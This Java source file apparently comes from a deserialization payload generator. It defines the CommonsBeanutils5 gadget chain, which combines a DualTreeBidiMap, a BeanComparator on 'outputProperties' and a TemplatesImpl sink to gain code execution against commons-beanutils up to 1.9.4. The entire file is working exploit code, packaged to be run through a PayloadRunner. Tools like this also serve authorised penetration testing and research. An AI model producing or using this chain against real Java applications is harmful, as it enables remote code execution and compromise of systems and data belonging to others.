package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;

import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 * CommonsBeanutilsDualTreeBidiMap
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.1"})
@Authors({Authors.Y4ER})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutils5 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils5.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.CaseInsensitiveComparator, version);

        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put(templates, templates);

        Reflections.setFieldValue(dualTreeBidiMap, "comparator", comparator);
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Map[] maps = (Map[]) Reflections.getFieldValue(dualTreeBidiMap, "maps");
        maps[0] = map;

        return dualTreeBidiMap;
    }
}
